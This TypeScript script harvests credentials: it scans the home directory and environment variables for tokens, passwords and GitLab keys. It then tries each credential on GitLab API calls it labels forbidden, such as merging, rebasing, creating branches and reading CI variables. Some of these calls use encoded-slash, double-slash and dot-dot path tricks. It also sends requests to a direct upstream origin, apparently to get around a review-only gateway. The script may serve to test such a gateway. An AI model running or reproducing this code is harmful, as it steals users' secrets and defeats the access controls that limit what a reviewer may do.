import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";

type Candidate = { source: string; token: string };
type Endpoint = { kind: "configured" | "direct"; origin: string };
type Attack = { name: string; method: string; path: string; body?: string; contentType?: string; forbidden: boolean };

const home = process.env.HOME ?? "";
const directOrigin = process.env.PROBE_DIRECT_UPSTREAM ?? "";
const project = "scratch%2Fedge-authority";
const mr = `/api/v4/projects/${project}/merge_requests/1`;

function walk(dir: string, depth: number): string[] {
  if (depth > 6) return [];
  let entries: string[];
  try {
    entries = readdirSync(dir);
  } catch {
    return [];
  }
  return entries.flatMap((entry) => {
    const full = join(dir, entry);
    try {
      const stat = statSync(full);
      if (stat.isDirectory()) return walk(full, depth + 1);
      return stat.size < 262144 ? [full] : [];
    } catch {
      return [];
    }
  });
}

function tokensInText(text: string): string[] {
  const found = new Set<string>();
  for (const match of text.matchAll(new RegExp("(?:token|password|private-token)\\s*[:=]\\s*[\"']?([A-Za-z0-9_\\-]{16,})", "gi"))) {
    found.add(match[1]);
  }
  for (const match of text.matchAll(new RegExp("glpat-[A-Za-z0-9_\\-]{16,}", "g"))) found.add(match[0]);
  return [...found];
}

function discoverCandidates(): Candidate[] {
  const candidates: Candidate[] = [];
  for (const [name, value] of Object.entries(process.env)) {
    if (value && new RegExp("TOKEN|GITLAB|GLAB", "i").test(name) && value.length >= 16) candidates.push({ source: `env:${name}`, token: value });
  }
  for (const file of walk(home, 0)) {
    let text: string;
    try {
      text = readFileSync(file, "utf8");
    } catch {
      continue;
    }
    for (const token of tokensInText(text)) candidates.push({ source: `file:${file.slice(home.length)}`, token });
  }
  const seen = new Set<string>();
  return candidates.filter((candidate) => (seen.has(candidate.token) ? false : (seen.add(candidate.token), true)));
}

function configuredOrigin(): string | null {
  for (const file of walk(join(home, ".config"), 0)) {
    if (!file.endsWith("config.yml")) continue;
    const text = readFileSync(file, "utf8");
    const host = text.match(new RegExp("^host:\\s*(\\S+)", "m"))?.[1];
    const protocol = text.match(new RegExp("api_protocol:\\s*(\\S+)"))?.[1] ?? "https";
    if (host) return `${protocol}:${"/".repeat(2)}${host}`;
  }
  return null;
}

const attacks: Attack[] = [
  { name: "put-merge", method: "PUT", path: `${mr}/merge`, forbidden: true },
  { name: "post-merge", method: "POST", path: `${mr}/merge`, forbidden: true },
  { name: "mwps", method: "POST", path: `${mr}/merge_when_pipeline_succeeds`, forbidden: true },
  { name: "put-mr-automerge", method: "PUT", path: mr, body: JSON.stringify({ merge_when_pipeline_succeeds: true }), contentType: "application/json", forbidden: true },
  { name: "approve-with-mwps-query", method: "POST", path: `${mr}/approve?merge_when_pipeline_succeeds=true`, forbidden: true },
  { name: "encoded-slash-merge", method: "PUT", path: `/api/v4/projects/${project}/merge_requests/1%2Fmerge`, forbidden: true },
  { name: "double-slash-merge", method: "PUT", path: `/api/v4/projects/${project}//merge_requests/1/merge`, forbidden: true },
  { name: "dotdot-merge", method: "PUT", path: `${mr}/notes/%2e%2e/merge`, forbidden: true },
  { name: "rebase", method: "PUT", path: `${mr}/rebase`, forbidden: true },
  { name: "branch-create", method: "POST", path: `/api/v4/projects/${project}/repository/branches`, body: JSON.stringify({ branch: "x", ref: "main" }), contentType: "application/json", forbidden: true },
  { name: "graphql-merge", method: "POST", path: "/api/graphql", body: JSON.stringify({ query: 'mutation { mergeRequestAccept(input: {projectPath: "scratch/edge-authority", iid: "1"}) { errors } }' }), contentType: "application/json", forbidden: true },
  { name: "read-ci-variables", method: "GET", path: `/api/v4/projects/${project}/variables`, forbidden: true },
  { name: "review-note", method: "POST", path: `${mr}/notes`, body: JSON.stringify({ body: "probe note" }), contentType: "application/json", forbidden: false },
  { name: "review-approve", method: "POST", path: `${mr}/approve`, forbidden: false },
  { name: "review-read", method: "GET", path: mr, forbidden: false },
];

async function attempt(endpoint: Endpoint, candidate: Candidate, attack: Attack) {
  const started = performance.now();
  let status = 0;
  try {
    const headers: Record<string, string> = { "private-token": candidate.token };
    if (attack.contentType) headers["content-type"] = attack.contentType;
    const response = await fetch(endpoint.origin + attack.path, { method: attack.method, headers, body: attack.body });
    status = response.status;
    await response.arrayBuffer();
  } catch {
    status = -1;
  }
  return {
    endpoint: endpoint.kind,
    tokenSource: candidate.source,
    attack: attack.name,
    forbidden: attack.forbidden,
    status,
    latencyMs: Math.round((performance.now() - started) * 100) / 100,
  };
}

const candidates = discoverCandidates();
const endpoints: Endpoint[] = [];
const configured = configuredOrigin();
if (configured) endpoints.push({ kind: "configured", origin: configured });
if (directOrigin) endpoints.push({ kind: "direct", origin: directOrigin });

const results = [];
for (const endpoint of endpoints) {
  for (const candidate of candidates) {
    for (const attack of attacks) results.push(await attempt(endpoint, candidate, attack));
  }
}
process.stdout.write(JSON.stringify({ candidates: candidates.map((candidate) => candidate.source), endpoints: endpoints.map((endpoint) => endpoint.kind), results }) + "\n");
